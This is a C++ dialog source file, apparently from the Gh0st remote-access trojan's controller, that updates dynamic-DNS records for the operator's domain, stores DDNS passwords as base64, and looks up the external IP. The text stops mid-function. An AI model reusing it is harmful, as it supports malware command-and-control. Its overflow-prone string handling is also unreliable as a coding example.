// UpdateDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Gh0st.h"
#include "UpdateDlg.h"

#include "winsock.h"//---
#include "afxinet.h" //WinInet所需要的头文件

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg dialog


CUpdateDlg::CUpdateDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUpdateDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUpdateDlg)
	m_EDIT_DnsIP = _T("");
	m_EDIT_DnsIPjiami = _T("");
	//}}AFX_DATA_INIT
}


void CUpdateDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpdateDlg)
	DDX_Control(pDX, IDC_GETWAN, m_getwan);
	DDX_Control(pDX, IDC_SIGNNOIP, m_SignNOIP);
	DDX_Control(pDX, IDC_SIGNNOIP2, m_SignNOIP2);
	DDX_Control(pDX, IDC_SIGNNOIP3, m_SignNOIP3);
	DDX_Control(pDX, IDC_COMBO_DNS, m_Combo_DnsIP);
	DDX_Text(pDX, IDC_EDIT_DNSUSER, m_DnsUser);
	DDV_MaxChars(pDX, m_DnsUser, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS, m_DnsPass);
	DDV_MaxChars(pDX, m_DnsPass, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN, m_DnsDomain);
	DDV_MaxChars(pDX, m_DnsDomain, 100);
	DDX_Check(pDX, IDC_3322, m_3322);
	DDX_Check(pDX, IDC_HUASHENG, m_oicp);
	DDX_Check(pDX, IDC_NOIP, m_noip);
	DDX_Text(pDX, IDC_EDIT_DNSIP, m_EDIT_DnsIP);
	DDX_Text(pDX, IDC_EDIT_DNSIPJIAMI, m_EDIT_DnsIPjiami);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUpdateDlg, CDialog)
	//{{AFX_MSG_MAP(CUpdateDlg)
	ON_BN_CLICKED(IDC_BTN_DNSUPDATE, OnBtnDnsupdate)
	ON_BN_CLICKED(IDC_GETWAN, OnGetwan)
	ON_BN_CLICKED(IDC_3322, On3322)
	ON_BN_CLICKED(IDC_HUASHENG, OnOicp)
	ON_BN_CLICKED(IDC_NOIP, OnNoip)
	ON_BN_CLICKED(IDC_DNSIPJIAMI, OnDnsipjiami)
	ON_BN_CLICKED(IDC_DNSIPSJFZ, OnDnsipsjfz)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg message handlers
BOOL CUpdateDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	UpdateData(TRUE);
	// TODO: Add extra initialization here
	m_SignNOIP.SetURL(_T("http://www.no-ip.com/newUser.php"));
    m_SignNOIP2.SetURL(_T("http://www.pubyun.com/accounts/signup/"));
	m_SignNOIP3.SetURL(_T("https://console.oray.com/passport/register.html?#per"));

    On3322();

	//获得IP--------------------------------
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1),&wsaData);
	char szhostname[128];
    
	if( gethostname(szhostname, 128) == 0 )
	{
		
		struct hostent * phost;
		int i,j,h_length=4;
		phost = gethostbyname(szhostname);
		for( i = 0; phost!= NULL && phost->h_addr_list[i]!= NULL; i++) 
		{
			CString str;
			for( j = 0; j<h_length; j++ ) 
			{
				CString addr;			
				if( j > 0 )
					str += ".";			
				addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
				str += addr;
			}
			m_Combo_DnsIP.AddString(str);	
		}
		m_Combo_DnsIP.SetCurSel(0);
	}

	
	BOOL   m_bOnline=TRUE;//是否在线
	DWORD dwFlag;
	m_bOnline=InternetGetConnectedState(&dwFlag,0);   
	if(m_bOnline)//在线
	{
		GetDlgItem(IDC_GETWAN)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_GETWAN)->EnableWindow(FALSE);
		SetDlgItemText(IDC_COMBO_DNS,"No Internet");
	}

	UpdateData(FALSE);	
	return TRUE; 
}

static char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int base64_encode1(const void *data, int size, char **str)
{
	char *s, *p;
	int i;
	int c;
	const unsigned char *q;
	
	p = s = (char*)malloc(size*4/3+4);
	if (p == NULL)
		return -1;
	q = (const unsigned char*)data;
	i=0;
	for(i = 0; i < size;){
		c=q[i++];
		c*=256;
		if(i < size)
			c+=q[i];
		i++;
		c*=256;
		if(i < size)
			c+=q[i];
		i++;
		p[0]=base64[(c&0x00fc0000) >> 18];
		p[1]=base64[(c&0x0003f000) >> 12];
		p[2]=base64[(c&0x00000fc0) >> 6];
		p[3]=base64[(c&0x0000003f) >> 0];
		if(i > size)
			p[3]='=';
		if(i > size+1)
			p[2]='=';
		p+=4;
	}
	*p=0;
	*str = s;
	return strlen(s);
}

char ShowText[200];
void CUpdateDlg::OnBtnDnsupdate() 
{
	// TODO: Add your control notification handler code here
  	UpdateData();
	if (m_3322)
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "3322User", m_DnsUser);
		CString Mistr;
		Mistr=Base64Encode(m_DnsPass);   //加密函数
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "3322Pass", Mistr);//保存密码
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "3322Domain",m_DnsDomain);
		
		CString strUrl, strDNS, strTmp = _T("");
		CString id,pass,ip; 
		GetDlgItem(IDC_EDIT_DNSUSER)->GetWindowText(id);
		GetDlgItem(IDC_EDIT_DNSPASS)->GetWindowText(pass);
		GetDlgItem(IDC_EDIT_DNSDOMAIN)->GetWindowText(strDNS);
		GetDlgItem(IDC_COMBO_DNS)->GetWindowText(ip);

		char a[256]="http://";
		char *b="@members.3322.org/dyndns/update?system=dyndns&hostname=";
		char *c="&myip=";
		char *d="&wildcard=OFF";
		
		strcat(a,id);
		strcat(a,":");
		strcat(a,pass);
		strcat(a,b);
		strcat(a,strDNS);
		strcat(a,c);
		strcat(a,ip);
		strcat(a,d);
		
		HINTERNET hNet = ::InternetOpen("3322", //当HTTP协议使用时，这个参数随意赋值
			PRE_CONFIG_INTERNET_ACCESS, //访问类型指示Win32网络函数使用登记信息去发现一个服务器
			NULL, 
			INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相当于提供却省的端口数
			0 //标志去指示使用返回句句柄的将来的Internet函数将"不"为回调函数发送状态信息 
			); 
		
		HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //从InternetOpen返回的句柄 
			(char *)a, //需要打开的URL 
			NULL, //用来向服务器传送额外的信息,一般为NULL 
			0, //用来向服务器传送额外的信息,一般为 0 
			INTERNET_FLAG_RELOAD, //InternetOpenUrl行为的标志 
			0); //信息将不会被送到状态回调函数 
		
		char buffer[1024] ; 
		DWORD dwBytesRead = 0; 
		BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
			buffer, //保留数据的缓冲区 
			sizeof(buffer), 
			&dwBytesRead); //指向包含读入缓冲区字节数的变量的指针; 
		//如果返回值是TRUE，而且这里指向0，则文件已经读到了文件的末尾。 
		
		::InternetCloseHandle(hUrlFile) ; 
		::InternetCloseHandle(hNet) ;
		
		if(buffer>0)
		{
			if(strstr(buffer,"badauth"))
			{
				SetDlgItemText(IDC_SHOWTIPS, _T("用户或密码错误,请重新更新"));
//				MessageBox("用户或密码错误 请重新更新 ...");
			}
			
			if(strstr(buffer,"good"))
			{
             	wsprintf(ShowText,"%s:%s","希网域名IP更新成功",ip);
                SetDlgItemText(IDC_SHOWTIPS, ShowText);
//				MessageBox("域名更新成功 ...\r\n"+ip+"\r\n");
			}
			if(strstr(buffer,"nohost"))
			{
				SetDlgItemText(IDC_SHOWTIPS, _T("域名不存在"));
//				MessageBox(_T("域名错误 ...\n\r请检查是否输入正确"));
			}
			if(strstr(buffer,"nochg"))
			{
                char ShowText[200];
             	wsprintf(ShowText,"%s:%s","IP已经指向该域名",ip);
                SetDlgItemText(IDC_SHOWTIPS, ShowText);
//				MessageBox(_T("域名里储存的IP已为当前IP ..."));
			}
			
		}
		else
		{
			::MessageBox(NULL,_T("域名更新成功 ..."),"Notice",MB_ICONINFORMATION);

		}
		memset(buffer,0,sizeof(buffer));
		
	}
	if (m_oicp)
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "OicpUser", m_DnsUser);
		CString Mistr;
		Mistr=Base64Encode(m_DnsPass);   //加密函数
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "OicpPass", Mistr);//保存密码
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "OicpDomain",m_DnsDomain);
		
	    CString id,pass,dns,ip; 
		GetDlgItem(IDC_EDIT_DNSUSER)->GetWindowText(id);
		GetDlgItem(IDC_EDIT_DNSPASS)->GetWindowText(pass);
		GetDlgItem(IDC_EDIT_DNSDOMAIN)->GetWindowText(dns);
		GetDlgItem(IDC_COMBO_DNS)->GetWindowText(ip);

		char a[256]="http://";
		char *b="@ddns.oray.com/ph/update?hostname=";
		char *c="&myip=";

		strcat(a,id);
		strcat(a,":");
		strcat(a,pass);
		strcat(a,b);
		strcat(a,dns);
		strcat(a,c);
		strcat(a,ip);

		HINTERNET hNet = ::InternetOpen("oray", //当HTTP协议使用时，这个参数随意赋值
			PRE_CONFIG_INTERNET_ACCESS, //访问类型指示Win32网络函数使用登记信息去发现一个服务器
			NULL, 
			INTERNET_INVALID_PORT_NUMBER, //使用INTERNET_INVALID_PORT_NUMBER相当于提供却省的端口数
			0 //标志去指示使用返回句句柄的将来的Internet函数将"不"为回调函数发送状态信息 
			); 
		
		HINTERNET hUrlFile = ::InternetOpenUrl(hNet, //从InternetOpen返回的句柄 
			(char *)a, //需要打开的URL 
			NULL, //用来向服务器传送额外的信息,一般为NULL 
			0, //用来向服务器传送额外的信息,一般为 0 
			INTERNET_FLAG_RELOAD, //InternetOpenUrl行为的标志 
			0); //信息将不会被送到状态回调函数 
		
		char buffer[1024] ; 
		DWORD dwBytesRead = 0; 
		BOOL bRead = ::InternetReadFile(hUrlFile, //InternetOpenUrl返回的句柄 
			buffer, //保留数据的缓冲区 
			sizeof(buffer), 
			&dwBytesRead); //指向包含读入缓冲区字节数的变量的指针; 
		//如果返回值是TRUE，而且这里指向0，则文件已经读到了文件的末尾。 
		
		::InternetCloseHandle(hUrlFile) ; 
		::InternetCloseHandle(hNet) ;
		
//		CString HotName="花生壳域名IP更新";
		if(buffer>0)
		{
		if(strstr(buffer,"good"))
            SetDlgItemText(IDC_SHOWTIPS,"花生壳IP更新成功:"+ip);
//			MessageBox("更新成功，已更改域名IP ...\r\n"+ip+"\r\n", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"nochg"))
            SetDlgItemText(IDC_SHOWTIPS,"IP已经指向该域名:"+ip);
//			MessageBox("存储IP相同，没有改变IP ...", HotName, MB_OK | MB_ICONASTERISK);
		else if(strstr(buffer,"notfqdn"))
			SetDlgItemText(IDC_SHOWTIPS, _T("更新失败,未激活花生壳域名"));
//			MessageBox("更新失败，未激活花生壳域名 ...", HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"nohost"))
			SetDlgItemText(IDC_SHOWTIPS, _T("域名不存在"));
//			MessageBox("域名不存在或未激活花生壳 ...",HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"abuse"))
			SetDlgItemText(IDC_SHOWTIPS, _T("频繁请求或验证失败"));
//			MessageBox("频繁请求或验证失败 ...",HotName, MB_OK | MB_ICONWARNING);
		else if(strstr(buffer,"badauth"))
			SetDlgItemText(IDC_SHOWTIPS, _T("用户或密码错误,请重新更新"));
//			MessageBox("更新失败，用户名或密码错误 ...",HotName, MB_OK | MB_ICONWARNING);
		else
			SetDlgItemText(IDC_SHOWTIPS, _T("未知名错误 ..."));
//			MessageBox("未知名错误 ...",HotName, MB_OK | MB_ICONWARNING);
		}
	}
	if (m_noip)
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "NoipUser", m_DnsUser);
		CString Mistr;
		Mistr=Base64Encode(m_DnsPass);   //加密函数
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "NoipPass", Mistr);//保存密码
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("UpdateIp", "NoipDomain",m_DnsDomain);
		

		CString strUrl, strDNS, strTmp = _T("");
		CString id,pass,ip;
		GetDlgItem(IDC_EDIT_DNSUSER)->GetWindowText(id);
		GetDlgItem(IDC_EDIT_DNSPASS)->GetWindowText(pass);
		GetDlgItem(IDC_EDIT_DNSDOMAIN)->GetWindowText(strDNS);
		GetDlgItem(IDC_COMBO_DNS)->GetWindowText(ip);
		
		strUrl = _T("http://");
		strUrl += _T("dynupdate.no-ip.com/nic/update?hostname=");
		strUrl += strDNS;
		strUrl += _T("&myip=");
		strUrl += ip;
		
		char szEncode[MAX_PATH];
		char *szOut;
		wsprintfA(szEncode, _T("%s:%s"), id, pass);
		base64_encode1(szEncode, strlen(szEncode), &szOut);
		
		SetDlgItemText(IDC_SHOWTIPS, _T("Update...Wait..."));
		
		CString strHeaders;
		strHeaders.Format(_T("Authorization:Basic %s"), szOut);//= _T("c2Vla3dpbmRzQGdtYWlsLmNvbTp5aW5nNTg0MjAzMzQ0");
		CInternetSession m_Session(NULL, 0);
		CHttpFile* pHttpFile = NULL;
		pHttpFile = (CHttpFile*)m_Session.OpenURL(strUrl, 1, INTERNET_FLAG_TRANSFER_ASCII | INTERNET_FLAG_SECURE, strHeaders, strHeaders.GetLength());
		char szRet[1024];
		if(pHttpFile != NULL)
		{	
			while (pHttpFile->ReadString((LPTSTR)szRet, 1024) != NULL)
			{
				strTmp += szRet;
			}
		}
		pHttpFile->Close();
		m_Session.Close();							
		delete pHttpFile;
		pHttpFile = NULL;
		if(strTmp.GetLength()>0)
		{
			if(strstr(strTmp,_T("badauth")))
			{
				SetDlgItemText(IDC_SHOWTIPS, _T("用户或密码错误,请重新更新"));
//				SetDlgItemText(IDC_SHOWTIPS, _T("Password or UserName Wrong"));
			}
			if(strstr(strTmp,_T("good")))
			{
             	wsprintf(ShowText,"%s:%s","No-IP 更新成功",ip);
                SetDlgItemText(IDC_SHOWTIPS, ShowText);
			}
			if(strstr(strTmp,_T("nohost")))
			{
				SetDlgItemText(IDC_SHOWTIPS, _T("域名不存在"));
			}
			if(strstr(strTmp,_T("nochg")))
			{
             	wsprintf(ShowText,"%s:%s","IP已经指向该域名",ip);
                SetDlgItemText(IDC_SHOWTIPS, ShowText);
			}
		}
		else
		{
			SetDlgItemText(IDC_SHOWTIPS, _T("No-IP 更新成功"));
		}	
	}
}

void CUpdateDlg::OnGetwan() 
{
	// TODO: Add your control notification handler code here
// 	try
//     {
//         CInternetSession session;
//         CString strURL(_T("http://ip.3322.org/"));
//         CFile* pFile = session.OpenURL(strURL);
//         DWORD dwLen = pFile->GetLength();
//         char* pBuf = new char[dwLen+1];
//         memset(pBuf, 0, sizeof(char)*(dwLen+1));
//         pFile->Read(pBuf, dwLen);
//         SetDlgItemText(IDC_COMBO_DNS, CString(pBuf));
// 		SetDlgItemText(IDC_EDIT_DNSIP, CString(pBuf));
//         delete[] pBuf;
//         pBuf = NULL;
//         pFile->Close();
// 		SetDlgItemText(IDC_SHOWTIPS, _T("获取外网IP成功"));
//     }
//     catch (CException* e)
//     {
//         e->ReportError();
//         e->Delete();
//     }
	CUpdateDlg sty;
	CString Gip;
	
	m_getwan.EnableWindow(FALSE);  //禁用按键
	Gip=sty.GetIPAddress();
	SetDlgItemText(IDC_COMBO_DNS, Gip);
	SetDlgItemText(IDC_EDIT_DNSIP, Gip);
	SetDlgItemText(IDC_SHOWTIPS, _T("获取外网IP成功"));
 //   SetDlgItemText(IDC_LONGIP2,Gip);
	m_getwan.EnableWindow(TRUE);   //恢复按键
}

void CUpdateDlg::On3322() 
{
	// TODO: Add your control notification handler code here
  	UpdateData(TRUE);
	CString Mistr;
	m_3322 = ((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("UpdateIp", "3322",TRUE);
	m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "3322User", "xxx@hotmail.com");//_T("xxx@hotmail.com");
//	m_DnsPass = _T("xxxxx");
	Mistr  = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "3322Pass", "xxxxx");	
	m_DnsPass=Base64Decode(Mistr);   //解密
	m_DnsDomain =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "3322Domain", "xxx.f3322.org");//_T("xxx.f3322.org");
	UpdateData(FALSE);
}

void CUpdateDlg::OnOicp() 
{
	// TODO: Add your control notification handler code here
  	UpdateData(TRUE);
	CString Mistr;
//	m_oicp = ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("UpdateIp", "Oicp",TRUE);
	m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "OicpUser", "xxx@hotmail.com");//_T("xxx@hotmail.com");
//	m_DnsPass = _T("xxxxx");
	Mistr  = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "OicpPass", "xxxxx");	
	m_DnsPass=Base64Decode(Mistr);   //解密
	m_DnsDomain =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "OicpDomain", "xxx.oicp.org");//_T("xxx.oicp.org");
	UpdateData(FALSE);
}

void CUpdateDlg::OnNoip() 
{
	// TODO: Add your control notification handler code here
  	UpdateData(TRUE);
	CString Mistr;
//	m_noip = ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("UpdateIp", "Noip",TRUE);
	m_DnsUser = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "NoipUser", "xxx@hotmail.com");//_T("xxx@hotmail.com");
//	m_DnsPass = _T("xxxxx");
	Mistr  = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "NoipPass", "xxxxx");	
	m_DnsPass=Base64Decode(Mistr);   //解密
	m_DnsDomain =((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("UpdateIp", "NoipDomain", "xxx.no-ip.org");//_T("xxx.no-ip.org");
	UpdateData(FALSE);
}

//////////////////////////////////////////////////////////////////////////
//Base64加密函数
//////////////////////////////////////////////////////////////////////////
CString CUpdateDlg::Base64Encode(LPCTSTR lpszSrc)   //加密函数
{
 ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
 const char BASE64_ENCODE_TABLE[64] = {
  65,  66,  67,  68,  69,  70,  71,  72,  // 00 - 07
   73,  74,  75,  76,  77,  78,  79,  80,  // 08 - 15
   81,  82,  83,  84,  85,  86,  87,  88,  // 16 - 23
   89,  90,  97,  98,  99, 100, 101, 102,  // 24 - 31
   103, 104, 105, 106, 107, 108, 109, 110,  // 32 - 39
   111, 112, 113, 114, 115, 116, 117, 118,  // 40 - 47
   119, 120, 121, 122,  48,  49,  50,  51,  // 48 - 55
   52,  53,  54,  55,  56,  57,  43,  47 };// 56 - 63

  unsigned int iTest;

  LPCTSTR pInBuffer=lpszSrc;

  int nSize = (int)_tcslen(lpszSrc);
  char* pOutBuffer=new char[nSize/3*4+5];
  ZeroMemory(pOutBuffer,nSize/3*4+5);

  for(UINT i=0;i<_tcslen(lpszSrc) / 3;i++)
  {
   iTest = (unsigned char) *pInBuffer++;
   iTest = iTest << 8;

   iTest = iTest | (unsigned char) *pInBuffer++;
   iTest = iTest << 8;

   iTest = iTest | (unsigned char) *pInBuffer++;

   //以4 byte倒序写入输出缓冲
   pOutBuffer[3] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[2] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer+=4;
  }

  //设置尾部
  switch (_tcslen(lpszSrc) % 3)
  {
  case 0:
   break;
  case 1:
   iTest = (unsigned char) *pInBuffer;
   iTest = iTest << 4;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer[2] = '='; //用'='也就是64码填充剩余部分
   pOutBuffer[3] = '=';
   break;
  case 2:
   iTest = (unsigned char) *pInBuffer++;
   iTest = iTest << 8;
   iTest = iTest | (unsigned char) *pInBuffer;
   iTest = iTest << 2;
   pOutBuffer[2] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[1] = BASE64_ENCODE_TABLE[iTest & 0x3F];
   iTest = iTest >> 6;
   pOutBuffer[0] = BASE64_ENCODE_TABLE[iTest];
   pOutBuffer[3] = '='; // Fill remaining byte.
   break;
  }
  pOutBuffer-=nSize/3*4;
  CString strEncode=pOutBuffer;
  delete [] pOutBuffer;
  pOutBuffer=NULL;
  return strEncode;
}

//////////////////////////////////////////////////////////////////////////
//Base64解密函数
//////////////////////////////////////////////////////////////////////////
CString CUpdateDlg::Base64Decode(LPCTSTR lpszSrc) 
{
 ASSERT(lpszSrc != NULL && AfxIsValidString(lpszSrc));
 const unsigned int BASE64_DECODE_TABLE[256] = {
  255, 255, 255, 255, 255, 255, 255, 255, //  00 -  07
   255, 255, 255, 255, 255, 255, 255, 255, //  08 -  15
   255, 255, 255, 255, 255, 255, 255, 255, //  16 -  23
   255, 255, 255, 255, 255, 255, 255, 255, //  24 -  31
   255, 255, 255, 255, 255, 255, 255, 255, //  32 -  39
   255, 255, 255,  62, 255, 255, 255,  63, //  40 -  47
   52,  53,  54,  55,  56,  57,  58,  59, //  48 -  55
   60,  61, 255, 255, 255, 255, 255, 255, //  56 -  63
   255,   0,   1,   2,   3,   4,   5,   6, //  64 -  71
   7,   8,   9,  10,  11,  12,  13,  14, //  72 -  79
   15,  16,  17,  18,  19,  20,  21,  22, //  80 -  87
   23,  24,  25, 255, 255, 255, 255, 255, //  88 -  95
   255,  26,  27,  28,  29,  30,  31,  32, //  96 - 103
   33,  34,  35,  36,  37,  38,  39,  40, // 104 - 111
   41,  42,  43,  44,  45,  46,  47,  48, // 112 - 119
   49,  50,  51, 255, 255, 255, 255, 255, // 120 - 127
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255,
   255, 255, 255, 255, 255, 255, 255, 255 };


  const int nSrcCount=(int)_tcslen(lpszSrc);
  int nSize=nSrcCount/4*3;
  if(lpszSrc[nSrcCount-1]=='=')
   nSize--;
  if(lpszSrc[nSrcCount-2]=='=')
   nSize--;
  char* pOutBuffer=new char[nSize+3];
  ZeroMemory(pOutBuffer,nSize+3);
  LPCTSTR pInBuffer=lpszSrc;
  UINT iTest,iPack;
  for(int i=0;i<nSize/3 ;i++)
  {
   for(int j=0;j<4;j++)
   {
    iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
    //InPtr++;
    if (iTest == 0xFF) 
    {
     j--;
     continue; //读到255非法字符
    }
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   pOutBuffer[2] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[1] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[0] = iPack;
   //准备写入后3位
   pOutBuffer+= 3; iPack = 0;

  }
  switch(nSize%3)
  {
  case 1:
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iPack = iPack >> 4;
   pOutBuffer[0] = iPack;
   pOutBuffer++;
   break;
  case 2:
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iTest = BASE64_DECODE_TABLE[*pInBuffer++]; // Read from InputBuffer.
   if (iTest != 0xFF)
   {
    iPack = iPack << 6 ;
    iPack = iPack | iTest ;
   }
   iPack = iPack >> 2;
   pOutBuffer[1] = iPack;
   iPack = iPack >> 8;
   pOutBuffer[0] = iPack;
   pOutBuffer+=2;
   break;
  default:
   break;
  }
  pOutBuffer-=nSize;
  CString strDecode=pOutBuffer;
  delete pOutBuffer;
  return strDecode;
}

// RC4 初始化
void CUpdateDlg::rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
{
	int i =0, j = 0, k[256] = {0};
	unsigned char tmp = 0;
	for(i=0;i<256;i++)
	{
		s[i]=i;
		k[i]=key[i%Len];
	}
	for (i=0; i<256; i++)
	{
		j=(j+s[i]+k[i])%256;
		tmp = s[i];
		s[i] = s[j];     //交换s[i]和s[j]
		s[j] = tmp;
	}
}

// RC4 加密解密函数
void CUpdateDlg::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
{
	int x = 0, y = 0, t = 0;
	unsigned char tmp;
	unsigned long i;
	for(i=0;i<Len;i++)
	{
		x=(x+1)%256;
		y=(y+s[x])%256;
		tmp = s[x];
		s[x] = s[y];     //交换s[x]和s[y]
		s[y] = tmp;
		t=(s[x]+s[y])%256;
		Data[i] ^= s[t];
	} 
}


CString GetExePath()       
{       
	char pathbuf[260];          
    int  pathlen = ::GetModuleFileName(NULL,pathbuf,MAX_PATH);          
    // 替换掉单杠       
    while(TRUE)          
    {          
        if(pathbuf[pathlen--]=='\\')
            break;          
    }          
    pathbuf[++pathlen]= 0*0;          
    CString  fname = pathbuf;          
    return   fname;          
}

int CUpdateDlg::memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

char* CUpdateDlg::substr(char   *str,int   istar,int   iend) 
{ 
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 
	
    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		strcpy(p1,p); 
    else 
    { 
        //p1+=iend; 
		memcpy(p1,p,iend); 
    }
	strcpy(str,p1);
    return   str; 
	
} 

int CUpdateDlg::ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		strncpy(caNewString, sSrc, StringLen);
		strcat(caNewString, sReplaceStr);
		strcat(caNewString, FindPos + strlen(sMatchStr));
		strcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	free(FindPos);
	return 0;
}

CString CUpdateDlg::GetIPAddress()     
{     
	char buf[MAX_PATH] = {0};     
    char chTempIp[128]= {0};    
	
    CString strPath;     
    strPath = GetExePath() + "\\netip.ini";
    URLDownloadToFile(0,"http://ddns.oray.com/checkip",strPath,0,NULL);
	
    FILE *file=fopen( strPath, "r" );     
    if ( file != NULL )      
    {
        fseek(file, 0, SEEK_SET);     
        fread(buf,1,256,file);     
		fclose(file);
		
		DWORD SizePoint;
		SizePoint = memfind(buf,"Address:",sizeof(buf),0);
		substr(buf,SizePoint+8,17);
		ReplaceStr(buf,":","");
		ReplaceStr(buf," ","");
		ReplaceStr(buf,"<","");
		ReplaceStr(buf,"/","");
		ReplaceStr(buf,"b","");
		ReplaceStr(buf,"o","");
		ReplaceStr(buf,"d","");
		ReplaceStr(buf,"y","");
		DeleteFile(strPath);
    }     
	
    CString strTemp="";
	int len = strlen(buf);
    if(len>0)
    {     
        strTemp.Format("%s",buf);     
    }     
    return strTemp;     
}    

void CUpdateDlg::OnDnsipjiami() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
 //   m_long_ipjm.EnableWindow(FALSE); 
	
	
	
